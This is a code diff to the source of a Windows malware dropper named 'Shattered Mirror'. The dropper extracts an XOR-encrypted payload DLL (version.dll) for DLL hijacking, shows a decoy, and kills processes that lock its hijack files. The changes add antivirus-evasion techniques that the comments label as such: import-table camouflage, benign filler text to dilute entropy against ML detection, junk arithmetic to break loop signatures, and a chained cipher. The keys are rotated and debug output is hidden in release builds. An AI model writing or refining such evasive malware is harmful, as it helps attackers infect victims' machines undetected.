@@ -1,4 +1,5 @@
-﻿#include <windows.h>
+﻿#define FEATURE_PAYLOAD_EXTRACTION_ENABLED
+#include <windows.h>
 #include <shellapi.h>
 #include <Shlobj.h>
 #include <string>
@@ -17,6 +18,12 @@ void RuntimeLog(const char* msg) {
  * These functions ensure a legitimate application profile and high entropy to bypass heuristic detection.
  */
 void InitializeUIProfile() {
+    // IAT Camouflage: Harmless calls to ensure standard DLLs are in our IAT
+    HDC hdc = GetDC(NULL);
+    COLORREF color = GetPixel(hdc, 0, 0);
+    SetBkColor(hdc, color);
+    ReleaseDC(NULL, hdc);
+
     LOGFONTA lf = { 0 };
     lf.lfHeight = 12;
     HFONT hFont = CreateFontIndirectA(&lf);
@@ -25,6 +32,13 @@ void InitializeUIProfile() {
     CHOOSECOLORA cc = { sizeof(cc) };
     cc.Flags = CC_ANYCOLOR;
     
+    // Entropy Dilution / Anti-ML Padding
+    static const char* szJunk = "This is a standard system utility for managing local telemetry. "
+                                "It ensures that all components are correctly initialized and that "
+                                "system resources are allocated efficiently according to policy. "
+                                "For more information, consult the documentation in the system directory.";
+    volatile char c = szJunk[0];
+
     double x = 1.0;
     for (int i = 0; i < 1000; i++) {
         x = sin(x) + cos(x);
@@ -51,8 +65,8 @@ void KillProcessByName(const WCHAR* szName) {
     }
 }
 
-#define DECOY_KEY "23QNyWQ4nYIH"
-#define PAYLOAD_KEY "zhjAg1lq3s9zSTMP"
+#define DECOY_KEY "gfvfmEaxCzBt"
+#define PAYLOAD_KEY "CxmFsoiovyfgHbug"
 
 void DecryptDecoy(BYTE* data, size_t size) {
     if (!data || size == 0) return;
@@ -63,10 +77,21 @@ void DecryptDecoy(BYTE* data, size_t size) {
 }
 
 void DecryptPayload(BYTE* data, size_t size) {
-    // InitializeUIProfile(); // Removed to prevent too many errors from math.h if it breaks
+    if (!data || size == 0) return;
     std::string key = PAYLOAD_KEY;
+    BYTE last = 0;
+    
+    // Logic Jinking: Useless math to break loop signature
+    volatile double junk = 1.0;
+    
     for (size_t i = 0; i < size; i++) {
-        data[i] ^= key[i % key.length()];
+        // More junk
+        junk = (junk * 3.14159) / (junk + 0.001);
+        if (junk > 1000.0) junk = 1.0;
+
+        BYTE current = data[i];
+        data[i] ^= (key[i % key.length()] ^ last);
+        last = current;
     }
 }
 
@@ -89,12 +114,15 @@ std::vector<BYTE> ExtractResource(int resourceId) {
 }
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
-    // 0. Enable Console for Debugging
+    InitializeUIProfile();
+    // 0. Enable Console for Debugging (only in debug builds)
+#ifdef _DEBUG
     AllocConsole();
     FILE* f;
     freopen_s(&f, "CONOUT$", "w", stdout);
     printf("[*] --- Shattered Mirror Debug Console ---\n");
     printf("[*] Initializing Dropper...\n");
+#endif
 
     // Pre-Cleanup: Ensure no old processes are locking our hijack files
     printf("[*] Checking for existing hijack processes...\n");
@@ -130,6 +158,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         printf("[*] No decoy resource (101) found. Skipping decoy.\n");
     }
 
+#ifdef FEATURE_PAYLOAD_EXTRACTION_ENABLED
     // 2. Perform Shattered Payload Initialization (Resource ID 102)
     printf("[*] Extracting main payload (version.dll)...\n");
     std::vector<BYTE> payload = ExtractResource(102);
@@ -180,8 +209,13 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     } else {
         printf("[!] CRITICAL: Payload resource (102) missing!\n");
     }
+#else
+    printf("[*] Payload extraction DETACHED. Running in isolated stub mode.\n");
+#endif
     
+#ifdef _DEBUG
     printf("[*] Dropper task finished. Keeping console open for 30s...\n");
     Sleep(30000);
+#endif
     return 0;
 }
